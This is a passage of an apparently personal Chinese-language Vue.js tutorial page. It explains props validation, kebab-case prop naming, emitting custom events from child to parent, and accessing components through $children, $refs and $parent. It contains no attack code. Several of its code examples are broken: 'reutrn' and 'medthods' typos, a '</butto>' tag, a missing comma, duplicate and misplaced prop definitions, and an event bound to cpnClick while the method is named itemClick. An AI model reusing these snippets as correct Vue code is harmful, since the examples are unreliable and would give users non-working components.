class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cpn = &#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span><br><span class="line">    <span class="comment">//数组形式</span></span><br><span class="line">    <span class="attr">props</span>:[<span class="string">&#x27;comvies&#x27;</span>,<span class="string">&#x27;cmessage&#x27;</span>],</span><br><span class="line">    <span class="comment">//字符串形式</span></span><br><span class="line">    <span class="attr">props</span>:&#123;</span><br><span class="line">        <span class="comment">//1.类型限制</span></span><br><span class="line">        <span class="attr">cmovies</span>:<span class="title class_">Array</span>,</span><br><span class="line">        <span class="attr">cmessage</span>:<span class="title class_">String</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2.提供一些默认值 默认值在没有传递的时候会显示 v-bind没有传时</span></span><br><span class="line">        <span class="comment">//required 为true时 说明这个属性是必传的 否则会报错</span></span><br><span class="line">        <span class="attr">cmessage</span>:&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="title class_">String</span>,</span><br><span class="line">            <span class="attr">default</span>:<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">            <span class="attr">required</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//类型是对象/数组时，默认值必须是一个函数</span></span><br><span class="line">        <span class="attr">cmovies</span>:&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="title class_">Array</span>,</span><br><span class="line">        <span class="comment">//default:[]  这样会报错</span></span><br><span class="line">        <span class="title function_">default</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>:&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="8.1.2-props驼峰标识">8.1.2 props驼峰标识<a title="#8.1.2-props驼峰标识" href="#8.1.2-props驼峰标识"></a></h4><p>在组件的应用不适合用驼峰  应该要用-</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在组件的应用不适合用驼峰  应该要用- --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">:c-info</span>=<span class="string">&quot;info&quot;</span> <span class="attr">:chile-my-message</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&#x27;cpn&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;cInfo&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;chileMyMessage&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="language-javascript">        template :<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">props</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cInfo</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>:<span class="title class_">Object</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">default</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">childMyMessage</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>:<span class="title class_">String</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">default</span>:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">info</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>:<span class="string">&quot;why&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">age</span>:<span class="number">18</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">height</span>:<span class="number">1.88</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            cpn</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8.2-子传父">8.2 子传父<a title="#8.2-子传父" href="#8.2-子传父"></a></h3><ul><li>如果需要子组件传递数据或事件到父组件中：应该使用自定义事件来完成</li><li>什么时候需要定义事件？<ul><li>当子组件需要向父组件传递数据时，就要用到自定义事件</li><li>v-on可以用来监听自定义事件</li></ul></li><li>自定义事件的流程<ul><li>在子组件中，通过$emit()来触发事件</li><li>在父组件中，通过v-on来监听子组件事件</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 父组件模板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 不能使用驼峰 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cpn</span> @<span class="attr">itemclick</span>=<span class="string">&quot;cpnClick&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子组件模板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-for</span>=<span class="string">&quot;item in categories&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick(item)&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">butto</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.子组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">categories</span>:[</span></span><br><span class="line"><span class="language-javascript">                    &#123;<span class="attr">id</span>:<span class="string">&#x27;aaa&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;热门推荐&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                    &#123;<span class="attr">id</span>:<span class="string">&#x27;bbb&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;手机数码&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;<span class="attr">id</span>:<span class="string">&#x27;ccc&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;家用电器&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;<span class="attr">id</span>:<span class="string">&#x27;ddd&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;电脑办公&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                ]</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btnClick</span>(<span class="params">item</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//传给父组件 自定义事件  子组件 发射 </span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.$emit(<span class="string">&#x27;itemclick&#x27;</span>,item);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//2.父组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            cpn</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">itemClick</span>(<span class="params">item</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;itemclick&#x27;</span>,item);   </span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8.3-父子组件的访问方式-：">8.3 父子组件的访问方式 ：<a title="#8.3-父子组件的访问方式-：" href="#8.3-父子组件的访问方式-："></a></h3><ul><li>有时候需要父组件直接访问子组件，子组件直接访问父组件，或者是子组件访问根组件<ul><li>父组件访问子组件：是使用<code>$children</code> <code>$refs</code></li><li>子组件访问父组件：使用<code>$parent</code></li></ul></li></ul><h4 id="8.3.1-父访问子-$children/$refs">8.3.1 父访问子 $children/$refs<a title="#8.3.1-父访问子-$children/$refs" href="#8.3.1-父访问子-$children/$refs"></a></h4><ul><li><code>this.$children</code>是一个数组类型，包含了所有的子组件对象</li><li>通过遍历，取出所有子组件的message状态</li></ul><h5 id="1.-$children">1. $children<a title="#1.-$children" href="#1.-$children"></a></h5><p>因为返回的是数组的形式，所以如果要添加便签的话就很麻烦 所以一般开发不使用这样的方法</p><p>一般只有拿到所有子组件的信息的时候，才会使用$children</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        我是子组件</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btnClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$children</span>); <span class="comment">//可以利用这个得到 子组件的各种属性 以数组的形式</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">$children</span>[<span class="number">0</span>].<span class="title function_">showMessage</span>(); <span class="comment">//然后调用</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//if 有多个组件要渲染</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">let</span> c <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">$children</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(c.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        reutrn&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">name</span>:<span class="string">&#x27;我是子组件的name&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">medthods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">showMessage</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;showMessage&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2.$refs">2.$refs<a title="#2.$refs" href="#2.$refs"></a></h5><p>对象类型 默认空对象  必须在组件加  ref=‘aaa’</p><p>一般都是使用这个属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">ref</span>=<span class="string">&#x27;aaa&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        我是子组件</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btnClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>);  </span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//如果没有在组件标签绑定 那返回空对象 若有绑定 就会返回有名字的对象 </span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//名字会作为这个对象的key</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">aaa</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">aaa</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        reutrn&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">name</span>:<span class="string">&#x27;我是子组件的name&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">medthods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">showMessage</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;showMessage&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="8.3.2-子访问父$parent和--$root">8.3.2 子访问父$parent和  $root<a title="#8.3.2-子访问父$parent和--$root" href="#8.3.2-子访问父$parent和--$root"></a></h4><p>用得很少，复用性不强</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&#x27;cpn&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ccpn</span>&gt;</span><span class="tag">&lt;/<span class="name">ccpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&#x27;ccpn&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是子组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&#x27;btnClick&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span 